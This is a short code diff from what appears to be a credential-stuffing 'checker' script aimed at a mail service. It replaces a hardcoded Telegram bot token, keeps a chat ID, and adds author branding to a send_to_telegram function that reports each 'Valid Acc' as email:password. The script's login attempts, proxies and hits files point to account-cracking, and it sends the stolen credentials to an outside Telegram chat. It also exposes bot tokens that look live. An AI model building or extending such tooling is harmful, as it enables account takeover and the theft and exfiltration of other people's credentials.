@@ -13,7 +13,7 @@ mail = MailHub()
 write_lock = threading.Lock()
 
 
-TELEGRAM_BOT_TOKEN = '7600065243:AAGfOhhAML68f5p1dAOiNRdj5gqhzYLQxTg'
+TELEGRAM_BOT_TOKEN = '8015416576:AAF-x4yxWwEnlGo9m17VRzvWkFVyWR2qf3Y'
 TELEGRAM_CHAT_ID = '7957784778'
 
 def validate_line(line):
@@ -41,6 +41,8 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
 
 def send_to_telegram(email, password):
     message = f"""
+    Done Checker By Arabian Dark Knight
+    🫡 By Masa
 
     Valid Acc : {email}:{password}
 
